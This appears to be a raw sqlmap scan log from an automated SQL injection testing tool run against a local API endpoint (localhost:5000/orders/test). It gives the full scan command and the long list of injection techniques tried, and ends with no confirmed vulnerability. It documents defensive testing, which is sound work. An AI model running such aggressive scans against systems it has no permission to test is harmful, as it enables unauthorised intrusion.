 ___ ___[']_____ ___ ___  {1.9.9.4#dev}
|_ -| . [.]     | .'| . |
|___|_  ["]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:01:12 /2025-09-26/

[19:01:14] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:01:14] [INFO] flushing session file
[19:01:14] [INFO] testing connection to the target URL
[19:01:14] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:01:14] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:01:14] [INFO] testing if the target URL content is stable
[19:01:15] [INFO] target URL content is stable
[19:01:15] [INFO] testing if URI parameter '#1*' is dynamic
[19:01:15] [INFO] URI parameter '#1*' appears to be dynamic
[19:01:15] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:01:15] [INFO] testing for SQL injection on URI parameter '#1*'
[19:01:15] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:15] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:15] [INFO] testing 'MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:01:15] [INFO] testing 'PostgreSQL AND error-based - WHERE or HAVING clause'
[19:01:15] [INFO] testing 'Microsoft SQL Server/Sybase AND error-based - WHERE or HAVING clause (IN)'
[19:01:15] [INFO] testing 'Oracle AND error-based - WHERE or HAVING clause (XMLType)'
[19:01:15] [INFO] testing 'Generic inline queries'
[19:01:15] [INFO] testing 'PostgreSQL > 8.1 stacked queries (comment)'
[19:01:15] [INFO] testing 'Microsoft SQL Server/Sybase stacked queries (comment)'
[19:01:15] [INFO] testing 'Oracle stacked queries (DBMS_PIPE.RECEIVE_MESSAGE - comment)'
[19:01:15] [INFO] testing 'MySQL >= 5.0.12 AND time-based blind (query SLEEP)'
[19:01:16] [INFO] testing 'PostgreSQL > 8.1 AND time-based blind'
[19:01:16] [INFO] testing 'Microsoft SQL Server/Sybase time-based blind (IF)'
[19:01:16] [INFO] testing 'Oracle AND time-based blind'
it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
[19:01:16] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
[19:01:16] [WARNING] reflective value(s) found and filtering out
[19:01:16] [WARNING] URI parameter '#1*' does not seem to be injectable
[19:01:16] [CRITICAL] all tested parameters do not appear to be injectable. Try to increase values for '--level'/'--risk' options if you wish to perform more tests. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
[19:01:16] [WARNING] HTTP error codes detected during run:
500 (Internal Server Error) - 77 times

[*] ending @ 19:01:16 /2025-09-26/

2025-09-26 19:01:16,417 - INFO - Flushed sqlmap session for http://localhost:5000/orders/test (log: attack-logs-dynamic\Get_orders_for_a_user_flush.log)
2025-09-26 19:01:16,417 - INFO - Executing command: 'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
2025-09-26 19:01:19,749 - INFO -         ___
2025-09-26 19:01:19,749 - INFO -        __H__
2025-09-26 19:01:19,749 - INFO -  ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
2025-09-26 19:01:19,749 - INFO - |_ -| . [)]     | .'| . |
2025-09-26 19:01:19,749 - INFO - |___|_  [(]_|_|_|__,|  _|
2025-09-26 19:01:19,749 - INFO -       |_|V...       |_|   https://sqlmap.org
2025-09-26 19:01:19,749 - INFO - 
2025-09-26 19:01:19,796 - INFO - [!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program
2025-09-26 19:01:19,796 - INFO - 
2025-09-26 19:01:19,796 - INFO - [*] starting @ 19:01:19 /2025-09-26/
2025-09-26 19:01:19,796 - INFO - 
2025-09-26 19:01:21,521 - INFO - [19:01:21] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
2025-09-26 19:01:22,114 - INFO - [19:01:22] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
2025-09-26 19:01:22,114 - INFO - do you want to try URI injections in the target URL itself? [Y/n/q] Y
2025-09-26 19:01:22,136 - INFO - [19:01:22] [INFO] testing connection to the target URL
2025-09-26 19:01:22,236 - INFO - [19:01:22] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
2025-09-26 19:01:22,237 - INFO - [19:01:22] [INFO] checking if the target is protected by some kind of WAF/IPS
2025-09-26 19:01:22,260 - INFO - [19:01:22] [INFO] testing if the target URL content is stable
2025-09-26 19:01:22,653 - INFO - [19:01:22] [INFO] target URL content is stable
2025-09-26 19:01:22,653 - INFO - [19:01:22] [INFO] testing if URI parameter '#1*' is dynamic
2025-09-26 19:01:22,767 - INFO - [19:01:22] [INFO] URI parameter '#1*' appears to be dynamic
2025-09-26 19:01:22,792 - INFO - [19:01:22] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
2025-09-26 19:01:22,802 - INFO - [19:01:22] [INFO] testing for SQL injection on URI parameter '#1*'
2025-09-26 19:01:22,867 - INFO - [19:01:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:22,910 - INFO - [19:01:22] [WARNING] reflective value(s) found and filtering out
2025-09-26 19:01:24,013 - INFO - [19:01:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:25,027 - INFO - [19:01:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:01:26,019 - INFO - [19:01:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:26,829 - INFO - [19:01:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:27,378 - INFO - [19:01:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:27,595 - INFO - [19:01:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:27,772 - INFO - [19:01:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:01:28,011 - INFO - [19:01:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:01:28,502 - INFO - [19:01:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
2025-09-26 19:01:28,905 - INFO - [19:01:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
2025-09-26 19:01:29,380 - INFO - [19:01:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:01:29,814 - INFO - [19:01:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
2025-09-26 19:01:30,246 - INFO - [19:01:30] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
2025-09-26 19:01:31,022 - INFO - [19:01:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:01:31,782 - INFO - [19:01:31] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
2025-09-26 19:01:32,645 - INFO - [19:01:32] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:01:33,481 - INFO - [19:01:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
2025-09-26 19:01:34,408 - INFO - [19:01:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:01:35,259 - INFO - [19:01:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
2025-09-26 19:01:36,087 - INFO - [19:01:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:01:36,868 - INFO - [19:01:36] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
2025-09-26 19:01:37,806 - INFO - [19:01:37] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:01:38,590 - INFO - [19:01:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
2025-09-26 19:01:39,443 - INFO - [19:01:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:01:40,232 - INFO - [19:01:40] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
2025-09-26 19:01:41,116 - INFO - [19:01:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:41,129 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
2025-09-26 19:01:41,152 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
2025-09-26 19:01:41,177 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
2025-09-26 19:01:41,199 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
2025-09-26 19:01:41,223 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
2025-09-26 19:01:41,246 - INFO - [19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
2025-09-26 19:01:41,256 - INFO - [19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
2025-09-26 19:01:41,289 - INFO - [19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:41,312 - INFO - [19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
2025-09-26 19:01:41,327 - INFO - [19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
2025-09-26 19:01:41,349 - INFO - [19:01:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
2025-09-26 19:01:41,363 - INFO - [19:01:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:41,410 - INFO - [19:01:41] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable
2025-09-26 19:01:41,411 - INFO - it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
2025-09-26 19:01:41,420 - INFO - [19:01:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
2025-09-26 19:01:41,420 - INFO - [19:01:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
2025-09-26 19:01:41,598 - INFO - [19:01:41] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
2025-09-26 19:01:41,809 - INFO - [19:01:41] [INFO] target URL appears to be UNION injectable with 6 columns
2025-09-26 19:01:42,177 - INFO - [19:01:42] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql')
2025-09-26 19:01:42,177 - INFO - [19:01:42] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
2025-09-26 19:01:42,338 - INFO - [19:01:42] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
2025-09-26 19:01:42,525 - INFO - [19:01:42] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
2025-09-26 19:01:42,743 - INFO - [19:01:42] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
2025-09-26 19:01:42,923 - INFO - [19:01:42] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
2025-09-26 19:01:43,149 - INFO - [19:01:43] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
2025-09-26 19:01:43,353 - INFO - [19:01:43] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
2025-09-26 19:01:43,597 - INFO - [19:01:43] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
2025-09-26 19:01:43,782 - INFO - [19:01:43] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
2025-09-26 19:01:43,795 - INFO - [19:01:43] [WARNING] false positive or unexploitable injection point detected
2025-09-26 19:01:43,795 - INFO - [19:01:43] [WARNING] URI parameter '#1*' does not seem to be injectable
2025-09-26 19:01:43,795 - INFO - other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
2025-09-26 19:01:43,795 - INFO - [19:01:43] [INFO] testing if parameter 'User-Agent' is dynamic
2025-09-26 19:01:43,810 - INFO - [19:01:43] [WARNING] parameter 'User-Agent' does not appear to be dynamic
2025-09-26 19:01:43,821 - INFO - [19:01:43] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
2025-09-26 19:01:43,831 - INFO - [19:01:43] [INFO] testing for SQL injection on parameter 'User-Agent'
2025-09-26 19:01:43,879 - INFO - [19:01:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:44,437 - INFO - [19:01:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:45,136 - INFO - [19:01:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:01:45,618 - INFO - [19:01:45] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:45,979 - INFO - [19:01:45] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:46,499 - INFO - [19:01:46] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:46,580 - INFO - [19:01:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:46,725 - INFO - [19:01:46] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:01:46,811 - INFO - [19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:46,832 - INFO - [19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:01:46,850 - INFO - [19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:01:46,858 - INFO - [19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:01:46,869 - INFO - [19:01:46] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:01:46,873 - INFO - [19:01:46] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:01:47,181 - INFO - it is recommended to perform only basic UNION tests if there is not at least one other (potential) technique found. Do you want to reduce the number of requests? [Y/n] Y
2025-09-26 19:01:47,181 - INFO - [19:01:47] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:01:47,762 - INFO - [19:01:47] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:01:48,335 - INFO - [19:01:48] [WARNING] parameter 'User-Agent' does not seem to be injectable
2025-09-26 19:01:48,335 - INFO - [19:01:48] [INFO] testing if parameter 'Referer' is dynamic
2025-09-26 19:01:48,351 - INFO - [19:01:48] [WARNING] parameter 'Referer' does not appear to be dynamic
2025-09-26 19:01:48,357 - INFO - [19:01:48] [WARNING] heuristic (basic) test shows that parameter 'Referer' might not be injectable
2025-09-26 19:01:48,371 - INFO - [19:01:48] [INFO] testing for SQL injection on parameter 'Referer'
2025-09-26 19:01:48,435 - INFO - [19:01:48] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:48,885 - INFO - [19:01:48] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:49,593 - INFO - [19:01:49] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:01:50,013 - INFO - [19:01:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:50,342 - INFO - [19:01:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:50,735 - INFO - [19:01:50] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:50,849 - INFO - [19:01:50] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:51,005 - INFO - [19:01:51] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:01:51,081 - INFO - [19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:51,098 - INFO - [19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:01:51,103 - INFO - [19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:01:51,115 - INFO - [19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:01:51,130 - INFO - [19:01:51] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:01:51,137 - INFO - [19:01:51] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:01:51,480 - INFO - [19:01:51] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:01:52,138 - INFO - [19:01:52] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:01:52,702 - INFO - [19:01:52] [WARNING] parameter 'Referer' does not seem to be injectable
2025-09-26 19:01:52,702 - INFO - [19:01:52] [INFO] testing if parameter 'Host' is dynamic
2025-09-26 19:01:52,704 - INFO - [19:01:52] [WARNING] parameter 'Host' does not appear to be dynamic
2025-09-26 19:01:52,717 - INFO - [19:01:52] [WARNING] heuristic (basic) test shows that parameter 'Host' might not be injectable
2025-09-26 19:01:52,725 - INFO - [19:01:52] [INFO] testing for SQL injection on parameter 'Host'
2025-09-26 19:01:52,781 - INFO - [19:01:52] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:53,282 - INFO - [19:01:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
2025-09-26 19:01:53,879 - INFO - [19:01:53] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
2025-09-26 19:01:54,284 - INFO - [19:01:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:54,555 - INFO - [19:01:54] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
2025-09-26 19:01:54,942 - INFO - [19:01:54] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:55,030 - INFO - [19:01:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
2025-09-26 19:01:55,178 - INFO - [19:01:55] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
2025-09-26 19:01:55,282 - INFO - [19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
2025-09-26 19:01:55,303 - INFO - [19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL)'
2025-09-26 19:01:55,309 - INFO - [19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (DUAL - original value)'
2025-09-26 19:01:55,329 - INFO - [19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE)'
2025-09-26 19:01:55,345 - INFO - [19:01:55] [INFO] testing 'Boolean-based blind - Parameter replace (CASE - original value)'
2025-09-26 19:01:55,361 - INFO - [19:01:55] [INFO] testing 'HAVING boolean-based blind - WHERE, GROUP BY clause'
2025-09-26 19:01:55,665 - INFO - [19:01:55] [INFO] testing 'Generic UNION query (NULL) - 1 to 10 columns'
2025-09-26 19:01:56,194 - INFO - [19:01:56] [INFO] testing 'Generic UNION query (random number) - 1 to 10 columns'
2025-09-26 19:01:56,936 - INFO - [19:01:56] [WARNING] parameter 'Host' does not seem to be injectable
2025-09-26 19:01:56,936 - INFO - [19:01:56] [CRITICAL] all tested parameters do not appear to be injectable. Rerun without providing the option '--technique'. If you suspect that there is some kind of protection mechanism involved (e.g. WAF) maybe you could try to use option '--tamper' (e.g. '--tamper=space2comment') and/or switch '--random-agent'
2025-09-26 19:01:56,943 - INFO - [19:01:56] [WARNING] HTTP error codes detected during run:
2025-09-26 19:01:56,943 - INFO - 500 (Internal Server Error) - 3453 times, 404 (Not Found) - 4 times
2025-09-26 19:01:56,943 - INFO - 
2025-09-26 19:01:56,946 - INFO - [*] ending @ 19:01:56 /2025-09-26/
2025-09-26 19:01:56,946 - INFO - 

-------------------- EXECUTING COMMAND --------------------
'C:\Users\Ronald Wilson\AppData\Local\Programs\Python\Python311\python.exe' 'F:\disruptiq-notes\sqlmap-dev\sqlmap.py' -u http://localhost:5000/orders/test --output-dir 'attack-logs-dynamic\Get_orders_for_a_user_sqlmap' --batch --level=5 --risk=3 --threads 5 --technique BU
--------------------------------------------------
        ___
       __H__
 ___ ___[)]_____ ___ ___  {1.9.9.4#dev}
|_ -| . [)]     | .'| . |
|___|_  [(]_|_|_|__,|  _|
      |_|V...       |_|   https://sqlmap.org

[!] legal disclaimer: Usage of sqlmap for attacking targets without prior mutual consent is illegal. It is the end user's responsibility to obey all applicable local, state and federal laws. Developers assume no liability and are not responsible for any misuse or damage caused by this program

[*] starting @ 19:01:19 /2025-09-26/

[19:01:21] [WARNING] using 'F:\disruptiq-notes\sql-injection-agent-from-openapi-spec\sqlmap-agent\attack-logs-dynamic\Get_orders_for_a_user_sqlmap' as the output directory
[19:01:22] [WARNING] you've provided target URL without any GET parameters (e.g. 'http://www.site.com/article.php?id=1') and without providing any POST parameters through option '--data'
do you want to try URI injections in the target URL itself? [Y/n/q] Y
[19:01:22] [INFO] testing connection to the target URL
[19:01:22] [WARNING] the web server responded with an HTTP error code (500) which could interfere with the results of the tests
[19:01:22] [INFO] checking if the target is protected by some kind of WAF/IPS
[19:01:22] [INFO] testing if the target URL content is stable
[19:01:22] [INFO] target URL content is stable
[19:01:22] [INFO] testing if URI parameter '#1*' is dynamic
[19:01:22] [INFO] URI parameter '#1*' appears to be dynamic
[19:01:22] [WARNING] heuristic (basic) test shows that URI parameter '#1*' might not be injectable
[19:01:22] [INFO] testing for SQL injection on URI parameter '#1*'
[19:01:22] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:22] [WARNING] reflective value(s) found and filtering out
[19:01:24] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
[19:01:25] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT)'
[19:01:26] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:26] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (subquery - comment)'
[19:01:27] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (comment)'
[19:01:27] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - comment)'
[19:01:28] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:01:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (MySQL comment)'
[19:01:28] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (NOT - MySQL comment)'
[19:01:29] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:01:29] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause (Microsoft Access comment)'
[19:01:30] [INFO] testing 'MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause'
[19:01:31] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:01:31] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (MAKE_SET)'
[19:01:32] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:01:33] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (ELT)'
[19:01:34] [INFO] testing 'MySQL AND boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:01:35] [INFO] testing 'MySQL OR boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)'
[19:01:36] [INFO] testing 'PostgreSQL AND boolean-based blind - WHERE or HAVING clause (CAST)'
[19:01:36] [INFO] testing 'PostgreSQL OR boolean-based blind - WHERE or HAVING clause (CAST)'
[19:01:37] [INFO] testing 'Oracle AND boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:01:38] [INFO] testing 'Oracle OR boolean-based blind - WHERE or HAVING clause (CTXSYS.DRITHSX.SN)'
[19:01:39] [INFO] testing 'SQLite AND boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:01:40] [INFO] testing 'SQLite OR boolean-based blind - WHERE, HAVING, GROUP BY or HAVING clause (JSON)'
[19:01:41] [INFO] testing 'Boolean-based blind - Parameter replace (original value)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (MAKE_SET - original value)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (ELT - original value)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int)'
[19:01:41] [INFO] testing 'MySQL boolean-based blind - Parameter replace (bool*int - original value)'
[19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace'
[19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (original value)'
[19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES)'
[19:01:41] [INFO] testing 'PostgreSQL boolean-based blind - Parameter replace (GENERATE_SERIES - original value)'
[19:01:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace'
[19:01:41] [INFO] testing 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)'
[19:01:41] [INFO] URI parameter '#1*' appears to be 'Microsoft SQL Server/Sybase boolean-based blind - Parameter replace (original value)' injectable 
it looks like the back-end DBMS is 'Microsoft SQL Server/Sybase'. Do you want to skip test payloads specific for other DBMSes? [Y/n] Y
[19:01:41] [INFO] testing 'Generic UNION query (NULL) - 1 to 20 columns'
[19:01:41] [INFO] automatically extending ranges for UNION query injection technique tests as there is at least one other (potential) technique found
[19:01:41] [INFO] testing 'Generic UNION query (random number) - 1 to 20 columns'
[19:01:41] [INFO] target URL appears to be UNION injectable with 6 columns
[19:01:42] [WARNING] if UNION based SQL injection is not detected, please consider and/or try to force the back-end DBMS (e.g. '--dbms=mysql') 
[19:01:42] [INFO] testing 'Generic UNION query (NULL) - 21 to 40 columns'
[19:01:42] [INFO] testing 'Generic UNION query (random number) - 21 to 40 columns'
[19:01:42] [INFO] testing 'Generic UNION query (NULL) - 41 to 60 columns'
[19:01:42] [INFO] testing 'Generic UNION query (random number) - 41 to 60 columns'
[19:01:42] [INFO] testing 'Generic UNION query (NULL) - 61 to 80 columns'
[19:01:43] [INFO] testing 'Generic UNION query (random number) - 61 to 80 columns'
[19:01:43] [INFO] testing 'Generic UNION query (NULL) - 81 to 100 columns'
[19:01:43] [INFO] testing 'Generic UNION query (random number) - 81 to 100 columns'
[19:01:43] [INFO] checking if the injection point on URI parameter '#1*' is a false positive
[19:01:43] [WARNING] false positive or unexploitable injection point detected
[19:01:43] [WARNING] URI parameter '#1*' does not seem to be injectable
other non-custom parameters found. Do you want to process them too? [Y/n/q] Y
[19:01:43] [INFO] testing if parameter 'User-Agent' is dynamic
[19:01:43] [WARNING] parameter 'User-Agent' does not appear to be dynamic
[19:01:43] [WARNING] heuristic (basic) test shows that parameter 'User-Agent' might not be injectable
[19:01:43] [INFO] testing for SQL injection on parameter 'User-Agent'
[19:01:43] [INFO] testing 'AND boolean-based blind - WHERE or HAVING clause'
[19:01:44] [INFO] testing 'OR boolean-based blind - WHERE or HAVING clause'
